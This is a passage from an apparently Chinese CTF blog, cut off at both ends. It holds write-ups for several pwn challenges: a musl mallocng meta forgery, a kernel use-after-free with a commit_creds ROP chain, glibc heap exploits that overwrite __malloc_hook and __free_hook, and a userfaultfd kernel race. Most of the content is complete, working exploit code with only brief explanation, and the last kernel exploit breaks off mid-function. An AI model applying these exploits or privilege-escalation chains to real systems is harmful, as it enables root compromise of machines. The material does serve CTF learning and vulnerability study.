fake_IO_FILEpayload = payload.ljust(0x2000, b&quot;z&quot;)context.log_level = &#x27;debug&#x27;create(0x38, b&#x27;e&#x27; * 0x38, 0x2000, payload)fake_name_addr = elf_base + 0x4d80fake_note = flat(fake_name_addr, fake_IO_FILE_addr, 0x38, 0x38, 0)fake_note_addr = libc_base + 0xb7d50create(0x4, b&#x27;f&#x27; * 0x4, 0x28, fake_note)create(0x4, b&#x27;g&#x27; * 0x4, 0x38, b&#x27;h&#x27; * 0x38)find(0x28, b&#x27;a&#x27; * 0x28)find(0x28, b&#x27;a&#x27; * 0x28)payload = flat(elf_base + 0x4cc0, __malloc_context, 0x38, 0x28, fake_note_addr)find(0x28, payload)delete(0x38, b&#x27;h&#x27; * 0x38)r.recvuntil(b&#x27;option: &#x27;)r.sendline(b&#x27;5&#x27;)# gdb.attach(#     r,#     &#x27;dir /mnt/hgfs/download/musl/musl-1.2.2/musl-1.2.2/src/malloc\\ndir /mnt/hgfs/download/musl/musl-1.2.2/musl-1.2.2/src/malloc/mallocng\\nb free&#x27;# )r.interactive()\n\n构造meta这里再继续花上一点篇幅讲解一下怎么构造meta，其实看别人博客也把我看晕了，自己对照源码然后调试发现并不难，所以我的exp也就整体进行了缩减。\nstatic struct mapinfo nontrivial_free(struct meta *g, int i)&#123;\tuint32_t self = 1u&lt;&lt;i;\tint sc = g-&gt;sizeclass;\tuint32_t mask = g-&gt;freed_mask | g-&gt;avail_mask;\tif (mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 &amp;&amp; okay_to_free(g)) &#123;\t\t// any multi-slot group is necessarily on an active list\t\t// here, but single-slot groups might or might not be.\t\tif (g-&gt;next) &#123;\t\t\tassert(sc &lt; 48);\t\t\tint activate_new = (ctx.active[sc]==g);\t\t\tdequeue(&amp;ctx.active[sc], g);\t\t\tif (activate_new &amp;&amp; ctx.active[sc])\t\t\t\tactivate_group(ctx.active[sc]);\t\t&#125;\t\treturn free_group(g);\t&#125;    ... ...&#125;\n\n可以看到我们如果想要进入dequeue需要进入if判断，并且内部还有个assert，我们需要绕过这两项。\n再关注一下meta结构\nstruct meta &#123;\tstruct meta *prev, *next;\tstruct group *mem;\tvolatile int avail_mask, freed_mask;\tuintptr_t last_idx:5;\tuintptr_t freeable:1;\tuintptr_t sizeclass:6;\tuintptr_t maplen:8*sizeof(uintptr_t)-12;&#125;;\n\n首先看if判断的第一个内容，我们先看一下在exp当中构造的meta的最后是什么形式表现的\n\n可以看到这里的avail_mask和freed_mask的或值是2等号左半边的值即为3，再看last_idx那么有半边也为3了，就轻松绕过了。再看后面的那个函数\nstatic int okay_to_free(struct meta *g)&#123;\tint sc = g-&gt;sizeclass;\tif (!g-&gt;freeable) return 0;\t// always free individual mmaps not suitable for reuse\tif (sc &gt;= 48 || get_stride(g) &lt; UNIT*size_classes[sc])\t\treturn 1;\t// always free groups allocated inside another group&#x27;s slot\t// since recreating them should not be expensive and they\t// might be blocking freeing of a much larger group.\tif (!g-&gt;maplen) return 1;\t// if there is another non-full group, free this one to\t// consolidate future allocations, reduce fragmentation.\tif (g-&gt;next != g) return 1;\t// free any group in a size class that&#x27;s not bouncing\tif (!is_bouncing(sc)) return 1;\tsize_t cnt = g-&gt;last_idx+1;\tsize_t usage = ctx.usage_by_class[sc];\t// if usage is high enough that a larger count should be\t// used, free the low-count group so a new one will be made.\tif (9*cnt &lt;= usage &amp;&amp; cnt &lt; 20)\t\treturn 1;\t// otherwise, keep the last group in a bouncing class.\treturn 0;&#125;\n\n我们只需要返回的结果不为0即可，所以对照上面的图片即可看到很轻松也是可以绕过的，最后则是里面的assert的不大于48，也是很简单就绕过了。但是在实验期间发现了一个新的检测，我把maplen删掉了之后出现了崩溃的情况，查看源码发现，maplen =0 表示group 不是新mmap 出来的在size_classes里，meta 一般申请的是堆空间brk 分配的，有可能是mmap 映射的，而group 都是使用的mmap 的空间。\nstatic struct mapinfo free_group(struct meta *g)&#123;\tstruct mapinfo mi = &#123; 0 &#125;;\tint sc = g-&gt;sizeclass;\tif (sc &lt; 48) &#123;\t\tctx.usage_by_class[sc] -= g-&gt;last_idx+1;\t&#125;\tif (g-&gt;maplen) &#123;\t\tstep_seq();\t\trecord_seq(sc);\t\tmi.base = g-&gt;mem;\t\tmi.len = g-&gt;maplen*4096UL;\t&#125; else &#123;\t\tvoid *p = g-&gt;mem;\t\tstruct meta *m = get_meta(p);\t\tint idx = get_slot_index(p);\t\tg-&gt;mem-&gt;meta = 0;\t\t// not checking size/reserved here; it&#x27;s intentionally invalid\t\tmi = nontrivial_free(m, idx);\t&#125;\tfree_meta(g);\treturn mi;&#125;\n\n源码这里也验证了，如果置为0就会进一步进行free，在get_meta就可会出现崩溃。其实在get_meta函数内存在很多assert都可以看一下，这里就不过多赘述了。\n\n参考链接：\nhttps://xz.aliyun.com/t/10326\nhttps://eqqie.cn/\n","categories":["pwn"],"tags":["musl"]},{"title":"practice Ⅱ","url":"/2022/10/19/practice2/","content":"Kernel pwn1题目非常简单，就是一道非常普通的内核堆题，不过由于思想有点活跃导致开始一直在往复杂的想去了\n吐槽一下：为什么cpio格式的要用img结尾我挂载了很久挂载不上，知道file一看发现是cpio格式\n题目分析int __fastcall test1_open(inode *inode, file *filp)&#123;  char *v2; // rax  int result; // eax  ((void (__fastcall *)(inode *, file *))_fentry__)(inode, filp);  v2 = (char *)kmem_cache_alloc_trace(kmalloc_caches[5], 0x24000C0LL, 0x20LL);  length = 0x20;  test1_buffer = v2;  result = 0;  used = 0;  return result;&#125;\n\nint __fastcall test1_release(inode *inode, file *filp)&#123;  _fentry__();  if ( test1_buffer )    kfree(test1_buffer, filp);  return 0;&#125;\n\n这里的漏洞点出在这个UAF上面（开始我还一直在找堆溢出）。因为没注意到在启动脚本中是没有开启kaslr的所以我在用tty_struct，sk_buff这些东西来泄漏基地址，然后泄漏栈地址完成栈迁移。但是发现这些结构体的文件都无法打开，然后仔细一看启动脚本发现并没有开启地址随机化，所以直接开搞就行。\n利用分析这里只需要seq_operations结构体即可，modify_ldt利用 这篇文章中提到过这个结构体的使用，可以去看一下这里就不再赘述了。\n题目比较简单直接放exp了\n综上，exp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/sem.h&gt;#include &lt;semaphore.h&gt;#include &lt;poll.h&gt;#include &lt;time.h&gt;void errExit(char *err_msg)&#123;    puts(err_msg);    exit(-1);&#125;size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;void get_shell()&#123;    if (getuid())    &#123;        printf(&quot;\\033[31m\\033[1m[x] Failed to get the root!\\033[0m\\n&quot;);        exit(-1);    &#125;    printf(&quot;\\033[32m\\033[1m[+] Successful to get the root. Execve root shell now...\\033[0m\\n&quot;);    system(&quot;/bin/sh&quot;);&#125;int seq_fd;unsigned long pop_rdi = 0xffffffff811cef9d;unsigned long init_cred = 0xffffffff81e497c0;unsigned long commit_creds = 0xffffffff810a1910;unsigned long swapgs = 0xffffffff81063844;unsigned long iretq = 0xffffffff81841297;unsigned long ret = 0xffffffff8100006f;int main()&#123;    signal(SIGSEGV, get_shell);    save_status();    char *buf = malloc(0x2000);    unsigned long *pointer_buf = malloc(0x2000);    int fd = open(&quot;/dev/test1&quot;, O_RDWR);    if (fd &lt; 0)    &#123;        puts(&quot;[*]open test1 error!&quot;);        exit(0);    &#125;    int fd1 = open(&quot;/dev/test1&quot;, O_RDWR);    if (fd1 &lt; 0)    &#123;        puts(&quot;[*]open test1 error!&quot;);        exit(0);    &#125;    write(fd1, buf, 0x20);    close(fd1);    read(fd, buf, 0x20);    seq_fd = open(&quot;/proc/self/stat&quot;, O_RDONLY);    if (seq_fd &lt; 0)    &#123;        errExit(&quot;failed to create stat!&quot;);    &#125;    pointer_buf[0] = 0xffffffff81542a59;    write(fd, pointer_buf, 0x20);    __asm__(        &quot;mov r15,   0xbeefdead\\n&quot;        &quot;mov r14,   commit_creds\\n&quot;        &quot;mov r13,   init_cred\\n&quot;        &quot;mov r12,   pop_rdi\\n&quot;        &quot;mov rbp,   ret\\n&quot;        &quot;mov rbx,   swapgs\\n&quot;        &quot;mov r11,   iretq\\n&quot;        &quot;mov r10,   iretq\\n&quot;        &quot;mov r9,    0xbeefdead\\n&quot;        &quot;mov r8,    0xbeefdead\\n&quot;        &quot;xor rax,   rax\\n&quot;        &quot;mov rcx,   0xbeefdead\\n&quot;        &quot;mov rdx,   8\\n&quot;        &quot;mov rsi,   rsp\\n&quot;        &quot;mov rdi,   seq_fd\\n&quot;        &quot;syscall&quot;);    return 0;&#125;\n\n然后我之前的上传脚本有点问题，所以修改了一下，这里放一下以后方便拿\nfrom pwn import *from sys import argvr = remote(&#x27;nc.eonew.cn&#x27;, 10101)context.log_level = &#x27;debug&#x27;def send_file(name, sym):    file = read(name)    f = b64e(file)    for i in range(100, 1500):        if len(f) % (1500-i) == 0:            break    size = i    print(len(f))    r.sendlineafter(sym, &quot;cd /tmp&quot;)    r.sendlineafter(sym, &quot;rm *&quot;)    for i in range(len(f) // size + 1):        log.info(&quot;Sending chunk &#123;&#125;/&#123;&#125;&quot;.format(i, len(f)//size))        r.sendlineafter(            sym, &quot;echo -n &#x27;&#123;&#125;&#x27;&gt;&gt;/tmp/exp.gz.b64&quot;.format(f[i*967:(i*967)+967]))    r.sendlineafter(sym, &quot;cat /tmp/exp.gz.b64 | base64 -d &gt;/tmp/exp.gz&quot;)    r.sendlineafter(sym, &quot;gzip -d /tmp/exp.gz&quot;)    r.sendlineafter(sym, &quot;chmod +x /tmp/exp&quot;)def exploit():    sym = &quot;$&quot;    if len(argv) == 2:        if argv[1] == &quot;root&quot;:            sym = &quot;#&quot;        elif argv[1] == &quot;user&quot;:            sym = &quot;$&quot;        else:            print(&quot;user or root?&quot;)            exit()    os.system(&#x27;rm exp.gz&#x27;)    os.system(&#x27;cp ./exp ./exp.bak&#x27;)    os.system(&#x27;gzip ./exp&#x27;)    os.system(&#x27;mv exp.bak exp&#x27;)    send_file(&quot;exp.gz&quot;, sym=sym)    r.interactive()if __name__ == &quot;__main__&quot;:    exploit()\n\nfog一道比较简单的堆题，不过需要利用一点特性，恰好是我以往不知道的特性。\nfast bin合并机制if (in_smallbin_range (nb))    &#123;      idx = smallbin_index (nb);      bin = bin_at (av, idx);      if ((victim = last (bin)) != bin)        &#123;          bck = victim-&gt;bk;\t  if (__glibc_unlikely (bck-&gt;fd != victim))\t    malloc_printerr (&quot;malloc(): smallbin double linked list corrupted&quot;);          set_inuse_bit_at_offset (victim, nb);          bin-&gt;bk = bck;          bck-&gt;fd = bin;          if (av != &amp;main_arena)\t    set_non_main_arena (victim);          check_malloced_chunk (av, victim, nb);#if USE_TCACHE\t  /* While we&#x27;re here, if we see other chunks of the same size,\t     stash them in the tcache.  */\t  size_t tc_idx = csize2tidx (nb);\t  if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)\t    &#123;\t      mchunkptr tc_victim;\t      /* While bin not empty and tcache not full, copy chunks over.  */\t      while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count\t\t     &amp;&amp; (tc_victim = last (bin)) != bin)\t\t&#123;\t\t  if (tc_victim != 0)\t\t    &#123;\t\t      bck = tc_victim-&gt;bk;\t\t      set_inuse_bit_at_offset (tc_victim, nb);\t\t      if (av != &amp;main_arena)\t\t\tset_non_main_arena (tc_victim);\t\t      bin-&gt;bk = bck;\t\t      bck-&gt;fd = bin;\t\t      tcache_put (tc_victim, tc_idx);\t            &#125;\t\t&#125;\t    &#125;#endif          void *p = chunk2mem (victim);          alloc_perturb (p, bytes);          return p;        &#125;    &#125;  /*     If this is a large request, consolidate fastbins before continuing.     While it might look excessive to kill all fastbins before     even seeing if there is space available, this avoids     fragmentation problems normally associated with fastbins.     Also, in practice, programs tend to have runs of either small or     large requests, but less often mixtures, so consolidation is not     invoked all that often in most programs. And the programs that     it is called frequently in otherwise tend to fragment.   */  else    &#123;      idx = largebin_index (nb);      if (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))        malloc_consolidate (av);    &#125;\n\n在_int_malloc中存在一个我一直没有注意过的细节，可以看到如果我们malloc的size大于smallbin的size就会进行malloc_consolidate，也就是如果size位large bin范围就会进入合并。并且这一个特性在高版本的libc中也同样存在。\n题目分析这里题目比较简单，就是普通的菜单题\n__int64 __fastcall sub_B1B(void *a1, int a2)&#123;  __int64 result; // rax  LODWORD(result) = read(0, a1, a2);  *((_BYTE *)a1 + (int)result) = 0;  return (unsigned int)result;&#125;\n\n分析发现这个函数存在off by null漏洞，在create和edit中都有调用。这里还需要了解有另外两点，一是在进行fopen时会产生一个size位0x230的chunk \nFILE *__fopen_internal (const char *filename, const char *mode, int is32)&#123;  struct locked_FILE  &#123;    struct _IO_FILE_plus fp;#ifdef _IO_MTSAFE_IO    _IO_lock_t lock;#endif    struct _IO_wide_data wd;  &#125; *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));  if (new_f == NULL)    return NULL;#ifdef _IO_MTSAFE_IO  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;#endif  _IO_no_init (&amp;new_f-&gt;fp.file, 0, 0, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;  _IO_new_file_init_internal (&amp;new_f-&gt;fp);  if (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != NULL)    return __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);  _IO_un_link (&amp;new_f-&gt;fp);  free (new_f);  return NULL;&#125;\n\n并且在close这里会free掉，还有就是在printf时会产生一个size位large bin范围的chunk，不过这一点我确实没找到相应源码，有师傅知道可以留言一下，并且我在自己写一个测试脚本时也没有产生，但是调试题目时发现确实存在一个size位0x410的chunk。\n知道了上面的内容就很简单了，使用堆合并得到UAF的堆块，随后劫持__malloc_hook位one_gadget即可getshell\n综上，expfrom pwn import *elf = ELF(&#x27;./fog&#x27;)# r = process(&#x27;./fog&#x27;)r = remote(&#x27;nc.eonew.cn&#x27;, 10006)libc = ELF(&#x27;./libc-2.23.so&#x27;)context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]def create(data_size, data=b&#x27;\\n&#x27;):    r.recvuntil(b&#x27;Your choice?&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;What size do you want?&#x27;)    r.sendline(bytes(str(data_size), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;Content: &#x27;)    r.send(data)def delete(idx):    r.recvuntil(b&#x27;Your choice?&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Which one do you want to delete?&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))def edit(idx, data):    r.recvuntil(b&#x27;Your choice?&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Which one do you want to modify?&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;What do you want to input?&#x27;)    r.send(data)def show(idx):    r.recvuntil(b&#x27;Your choice?&#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;Which one do you want to see?&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))create(0x68)  # 0create(0x68)  # 1create(0x68)  # 2create(0x68)  # 3create(0x68)  # 4create(0x68)  # 5create(0x68)  # 6create(0x68)  # 7create(0x68)  # 8create(0x68)  # 9create(0x68)  # 10create(0x68)  # 11create(0x68)  # 12create(0x68, b&#x27;\\x00&#x27;*0x30+flat(0, 0x31))  # 13create(0x68)  # 14for i in range(5):    delete(i)delete(13)delete(12)delete(11)delete(10)delete(9)show(5)r.recvuntil(b&#x27;Your choice?&#x27;)r.sendline(b&#x27;5&#x27;)edit(8, b&#x27;a&#x27;*0x60+p64(0x3f0))r.recvuntil(b&#x27;Your choice?&#x27;)r.sendline(b&#x27;6&#x27;)create(0x68)  # 0create(0x68)  # 1create(0x68)  # 2create(0x68)  # 3create(0x68)  # 4show(5)r.recvuntil(b&#x27;Content : &#x27;)libc_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))-0x3c4b78+0x29000print(hex(libc_base))create(0x68)  # 9delete(5)edit(9, p64(libc_base+libc.symbols[&#x27;__malloc_hook&#x27;]-0x23))create(0x68)  # 5create(0x68, b&#x27;\\x00&#x27;*0x13+p64(0x3f42a+libc_base))  # 10print(hex(libc_base+libc.symbols[&#x27;__malloc_hook&#x27;]))print(hex(0x3f42a+libc_base))# gdb.attach(r, &#x27;b*$rebase(0xC5D)&#x27;)r.recvuntil(b&#x27;Your choice?&#x27;)r.sendline(b&#x27;1&#x27;)# gdb.attach(r,&#x27;b*$rebase(0xC5D)&#x27;)r.interactive()\n\nTime heap题目非常简单，存在很明显的UAF，这里就不再分析了，直接给exp\nfrom pwn import *elf = ELF(&#x27;./time_heap&#x27;)# r = process(&#x27;./time_heap&#x27;)r = remote(&#x27;nc.eonew.cn&#x27;, 10015)libc = ELF(&#x27;./libc-2.31.so&#x27;)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.arch = &#x27;amd64&#x27;def create(size, contents, remark):    r.recvuntil(b&#x27;Your choice: &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Size: &#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;Content: &#x27;)    r.send(contents)    r.recvuntil(b&#x27;Remark: &#x27;)    r.send(remark)def delete(idx):    r.recvuntil(b&#x27;Your choice: &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))def edit(idx, contents, remark):    r.recvuntil(b&#x27;Your choice: &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;Content: &#x27;)    r.send(contents)    r.recvuntil(b&#x27;Remark: &#x27;)    r.send(remark)def show(idx):    r.recvuntil(b&#x27;Your choice: &#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))create(0x400, b&#x27;\\n&#x27;, b&#x27;\\n&#x27;)for i in range(7):    delete(0)    edit(0, flat([0]*2), b&#x27;\\n&#x27;)delete(0)show(0)r.recvuntil(&quot;Content: &quot;)libc_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))-0x1ecbe0+0x30000print(hex(libc_base))# gdb.attach(r)free_hook = libc_base+libc.symbols[&#x27;__free_hook&#x27;]system = libc_base + libc.symbols[&#x27;system&#x27;]edit(0, p64(free_hook), flat(0))create(0x400, b&#x27;/bin/sh\\x00&#x27;, flat(system))print(hex(free_hook))delete(1)# gdb.attach(r)r.interactive()\n\nkernel pwn2题目比较简单，就是普通的内核栈题\n题目分析__int64 __fastcall test2_write(__int64 a1, __int64 a2, __int64 a3)&#123;  __int64 size; // rdx  char *v4; // r12  __int64 v5; // rbx  __int64 result; // rax  __int64 v7; // rbx  char *v8; // r12  _fentry__(a1, a2, a3);  if ( (unsigned __int64)((int)used + size) &lt;= 0x100 )  &#123;    v7 = size;    msleep(2000LL);    v8 = (char *)&amp;test2_buffer + (int)used;    _check_object_size(v8, v7, 0LL);    copy_from_user(v8, a2, v7);    result = v7;    LODWORD(used) = v7 + used;  &#125;  else  &#123;    v4 = (char *)&amp;test2_buffer + (int)used;    v5 = 0x100 - (int)used;    _check_object_size(v4, v5, 0LL);    copy_from_user(v4, a2, v5);    result = v5;    LODWORD(used) = 0x100;  &#125;  return result;&#125;\n\n__int64 __fastcall test2_read(__int64 a1, __int64 a2)&#123;  unsigned __int64 size; // rdx  unsigned __int64 v3; // rbx  ((void (*)(void))_fentry__)();  v3 = 0LL;  if ( (int)used &lt;= size )  &#123;    if ( (int)used &gt; 0 )      return ((__int64 (__fastcall *)(__int64))get_buf)(a2);  &#125;  else if ( (int)used &gt; 0 )  &#123;    v3 = size;    LODWORD(used) = used - size;    if ( size &gt; 0x100 )    &#123;      _warn_printk(&quot;Buffer overflow detected (%d &lt; %lu)!\\n&quot;, 0x100LL);      BUG();    &#125;    _check_object_size(&amp;test2_buffer, size, 1LL);    copy_to_user(a2, &amp;test2_buffer, v3);  &#125;  return v3;&#125;\n\n__int64 __fastcall get_buf(__int64 a1, __int64 a2)&#123;  __int64 v2; // rbp  __int64 result; // rax  _QWORD v4[36]; // [rsp-120h] [rbp-120h] BYREF  _fentry__();  v4[35] = v2;  v4[32] = __readgsqword(0x28u);  if ( (unsigned __int64)(int)used &gt; 0x200 )  &#123;    fortify_panic(&quot;memcpy&quot;);    return test2_read((__int64)&quot;memcpy&quot;, a2);  &#125;  else  &#123;    memcpy(v4, &amp;test2_buffer, (int)used);    msleep(2000LL);    copy_to_user(a1, v4, used);    result = (int)used;    LODWORD(used) = 0;  &#125;  return result;&#125;\n\n这就是驱动比较重要的三个函数。\n在get_buf函数中会将全局变量的内容复制到栈上，然后再将栈上的内容发送给用户态。从头到尾其实看不出来什么问题，不过题目这里用msleep函数就已经算是明示存在条件竞争了。\n利用分析如果我们可以在get_buf中memcpy之后以及copy_to_user之前就可以泄漏出栈上的内容。\n具体的办法就是两个线程分别write并且分别进入if内的代码块和else内的代码块，首先在memcpy执行之前进入else的代码块修改used的为0x100，随后在copy_to_user之前执行完if内的代码块，那么此时used为0x100+size，所以此时可以泄漏出canary和kernel基地址了。\n有了上面泄漏的思路之后实现栈溢出也就很简单了这里就不提了\n综上，exp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/sem.h&gt;#include &lt;semaphore.h&gt;#include &lt;poll.h&gt;#include &lt;time.h&gt;size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;void get_shell()&#123;    if (getuid())    &#123;        printf(&quot;\\033[31m\\033[1m[x] Failed to get the root!\\033[0m\\n&quot;);        exit(-1);    &#125;    printf(&quot;\\033[32m\\033[1m[+] Successful to get the root. Execve root shell now...\\033[0m\\n&quot;);    system(&quot;/bin/sh&quot;);&#125;void errExit(char *err_msg)&#123;    puts(err_msg);    exit(-1);&#125;void RegisterUserfault(void *fault_page, void *handler)&#123;    pthread_t thr;    struct uffdio_api ua;    struct uffdio_register ur;    uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);    ua.api = UFFD_API;    ua.features = 0;    if (ioctl(uffd, UFFDIO_API, &amp;ua) == -1)        errExit(&quot;[-] ioctl-UFFDIO_API&quot;);    ur.range.start = (unsigned long)fault_page;    ur.range.len = 0x1000;    ur.mode = UFFDIO_REGISTER_MODE_MISSING;    if (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == -1)        errExit(&quot;[-] ioctl-UFFDIO_REGISTER&quot;);    int s = pthread_create(&amp;thr, NULL, handler, (void *)uffd);    if (s != 0)        errExit(&quot;[-] pthread_create&quot;);&#125;void *sleep_handle(void *arg)&#123;    struct uffd_msg msg;    int fault_cnt = 0;    long uffd;    struct uffdio_copy uffdio_copy;    ssize_t nread;    uffd = (long)arg;    puts(&quot;[+] sleep handler created&quot;);    for (;;)    &#123;        struct pollfd pollfd;        int nready;        pollfd.fd = uffd;        pollfd.events = POLLIN;        nready = poll(&amp;pollfd, 1, -1);        puts(&quot;[+] sleep handler unblocked&quot;);        if (nready == -1)            errExit(&quot;poll&quot;);        nread = read(uffd, &amp;msg, sizeof(msg));        sleep(4);        if (nread == 0)            errExit(&quot;EOF on userfaultfd!\\n&quot;);        if (nread == -1)            errExit(&quot;read&quot;);        if (msg.event != UFFD_EVENT_PAGEFAULT)            errExit(&quot;Unexpected event on userfaultfd\\n&quot;);        char *page = (char *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);        if (page == MAP_FAILED)        &#123;            errExit(&quot;[-] mmap err&quot;);        &#125;        struct uffdio_copy uc;        // init page        memset(page, 0, sizeof(page));        // *(page + 0x201) = 0x64;        uc.src = (unsigned long)page;        uc.dst = (unsigned long)msg.arg.pagefault.address &amp;                 ~(0x1000 - 1);        uc.len = 0x1000;        uc.mode = 0;        uc.copy = 0;        if (ioctl(uffd, UFFDIO_COPY, &amp;uc) == -1)            errExit(&quot;ioctl-UFFDIO_COPY&quot;);        puts(&quot;[+] sleep handler done&quot;);        return NULL;    &#125;&#125;unsigned long prepare_kernel_cred = NULL;unsigned long commit_creds = NULL;unsigned long pop_rdi = 0xffffffff810835c0;unsigned long swapgs_pop = 0xffffffff8106c984;unsigned long iretq = 0xffffffff81c014f5;unsigned long init_cred = NULL;unsigned long canary;void *overflow_handle(void *arg)&#123;    struct uffd_msg msg;    int fault_cnt = 0;    long uffd;    struct uffdio_copy uffdio_copy;    ssize_t nread;    uffd = (long)arg;    puts(&quot;[+] sleep handler created&quot;);    for (;;)    &#123;        struct pollfd pollfd;        int nready;        pollfd.fd = uffd;        pollfd.events = POLLIN;        nready = poll(&amp;pollfd, 1, -1);        puts(&quot;[+] sleep handler unblocked&quot;);        if (nready == -1)            errExit(&quot;poll&quot;);        nread = read(uffd, &amp;msg, sizeof(msg));        sleep(4);        if (nread == 0)            errExit(&quot;EOF on userfaultfd!\\n&quot;);        if (nread == -1)            errExit(&quot;read&quot;);        if (msg.event != UFFD_EVENT_PAGEFAULT)            errExit(&quot;Unexpected event on userfaultfd\\n&quot;);        char *page = (char *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);        if (page == MAP_FAILED)        &#123;            errExit(&quot;[-] mmap err&quot;);        &#125;        struct uffdio_copy uc;        // init page        memset(page, 0, sizeof(page));        // *(page + 0x201) = 0x64;        uc.src = (unsigned long)page;        uc.dst = (unsigned long)msg.arg.pagefault.address &amp;                 ~(0x1000 - 1);        uc.len = 0x1000;        uc.mode = 0;        uc.copy = 0;        if (ioctl(uffd, UFFDIO_COPY, &amp;uc) == -1)            errExit(&quot;ioctl-UFFDIO_COPY&quot;);        puts(&quot;[+] sleep handler done&quot;);        return NULL;    &#125;&#125;void print_hex(char *buf, int size)&#123;    int i;    puts(&quot;======================================&quot;);    printf(&quot;data :\\n&quot;);    for (i = 0; i &lt; (size / 8); i++)    &#123;        if (i % 2 == 0)        &#123;            if (i / 2 &lt; 10)            &#123;                printf(&quot;%d  &quot;, i / 2);            &#125;            else if (i / 2 &lt; 100)            &#123;                printf(&quot;%d &quot;, i / 2);            &#125;            else            &#123;                printf(&quot;%d&quot;, i / 2);            &#125;        &#125;        printf(&quot; %16llx&quot;, *(size_t *)(buf + i * 8));        if (i % 2 == 1)        &#123;            printf(&quot;\\n&quot;);        &#125;    &#125;    puts(&quot;======================================&quot;);&#125;int fd;int write_handler(char *buf)&#123;    sleep(2);    puts(&quot;now change uesed&quot;);    write(fd, buf, 0x200);&#125;int control_handler(char *buf)&#123;    write(fd, buf, 0xf0);&#125;int read_handler(char *buf)&#123;    sleep(1);    puts(&quot;now read buffer&quot;);    read(fd, buf, 0x200);&#125;int main()&#123;    save_status();    signal(SIGSEGV, get_shell);    setvbuf(stdout, 2, 0, 0);    fd = open(&quot;/dev/test2&quot;, O_RDWR);    if (fd &lt; 0)    &#123;        puts(&quot;[-] open test2 error!&quot;);    &#125;    char *buf = malloc(0x2000);    char *page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);    char *page2 = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);   